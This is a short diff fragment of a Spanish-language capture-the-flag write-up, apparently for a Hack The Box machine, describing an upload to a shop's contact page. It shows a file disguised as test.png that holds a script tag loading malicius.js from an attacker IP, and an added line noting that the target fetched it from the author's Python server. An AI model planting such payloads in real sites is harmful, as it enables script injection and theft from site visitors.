@@ -30,3 +30,4 @@ Este archivo se puede incluir en la web `http://shop.trickster.htb/contact-us`
 
 Creamos el fichero `test.png` con el contenido `<script src="http://10.10.14.18/malicius.js"></script>`
 
+El servicio web hace la solicitud al recurso que hemos levantado en el server de python
